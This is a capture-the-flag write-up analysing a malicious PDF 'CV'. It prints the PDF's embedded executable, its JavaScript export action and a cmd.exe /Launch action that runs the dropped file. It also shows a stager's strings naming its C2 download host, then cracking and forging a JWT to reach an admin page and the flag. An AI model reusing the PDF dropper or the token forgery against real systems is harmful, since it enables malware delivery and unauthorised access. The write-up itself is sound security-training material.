# C2?

## Description

None, [cv.pdf](https://dgactf.com/files/da258105e3730128142f8b782c577533/cv.pdf?token=eyJ1c2VyX2lkIjoyMCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NH0.aYbs1A.mqevWT9A7WkMGykHiWT_Jo-u5rE)

ðŸ˜‚

![c2.png](/assets/ctf/dgactf/c2.png)

## Solution

```bash
â””â”€$ pdf-parser cv.pdf
...
obj 7 0
 Type: /Filespec
 Referencing: 8 0 R

  <<
    /UF (template.pdf)
    /F (template.pdf)
    /EF
      <<
        /F 8 0 R
      >>
    /Desc (template)
    /Type /Filespec
  >>

obj 8 0
 Type:
 Referencing:
 Contains stream

obj 9 0
 Type: /Action
 Referencing:

  <<
    /S /JavaScript
    /JS (this.exportDataObject({ cName: "template", nLaunch: 0 });)
    /Type /Action
  >>

obj 10 0
 Type: /Action
 Referencing:

  <<
    /S /Launch
    /Type /Action
    /Win
      <<
        /F (cmd.exe)
        /D '(c:\\\\windows\\\\system32)'
        /P '(/Q /C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\\\template.pdf" (cd "My Documents"))&(if exist "Documents\\\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)\n\n\n\n\n\n\n\n\n\nTo view the encrypted content please check the "Do not show this message again" box and press Open.)'
      >>
  >>
...
```

Extract the executable from PDF streams
```bash
â””â”€$ pdf-parser -o 8 -f -d c2.exe cv.pdf
â””â”€$ file c2.exe
c2.elf: PE32 executable for MS Windows 4.00 (GUI), Intel i386, 5 sections
```

This is a stager which seems to download files from `zfgrilmkldfglk.dgactf.com`
```bash
â””â”€$ strings c2.exe
!This program cannot be run in DOS mode.
...
PAYLOAD:
...
/d.exe
PQVh
PSh-W
rund11.exe
zfgrilmkldfglk.dgactf.com
KERNEL32.dll
VirtualProtect
```

Hmmm
```powershell
â””â”€$ curl https://zfgrilmkldfglk.dgactf.com
C2 Locked!                                                                                                                                                                                   
â””â”€$ curl https://zfgrilmkldfglk.dgactf.com/d.exe
<pre>Cannot GET /d.exe</pre>
â””â”€$ curl https://zfgrilmkldfglk.dgactf.com/rund11.exe
<pre>Cannot GET /rund11.exe</pre>
```

```bash
â””â”€$ curl https://zfgrilmkldfglk.dgactf.com/ -is | grep cookie
set-cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzcwNDUxNDkzfQ.BOR9eErGYMjClnji3kypmJs08NuhlbuZvNzNLyQb_ho; Path=/

â””â”€$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzcwNDUxNDkzfQ.BOR9eErGYMjClnji3kypmJs08NuhlbuZvNzNLyQb_ho' -C -d /wordlists/rockyou.txt
...
[*] Tested 14 million passwords so far
[+] CORRECT key found:
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

```bash
â””â”€$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzcwNDUxNDkzfQ.BOR9eErGYMjClnji3kypmJs08NuhlbuZvNzNLyQb_ho' -S hs256 -p '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!' -I -pc role -pv admin -pc username -pv admin
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzcwNDUxNDkzfQ.8hnKEHMj0C0Ovs2mOQ_YpocaeFNE5Cc8MB2B4qUEdUI

â””â”€$ curl https://zfgrilmkldfglk.dgactf.com/ -b 'jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzcwNDUxNDkzfQ.8hnKEHMj0C0Ovs2mOQ_YpocaeFNE5Cc8MB2B4qUEdUI'
DGA{N00B_4PT_F0R_R34L}
```

::: tip Flag
`DGA{N00B_4PT_F0R_R34L}`
:::

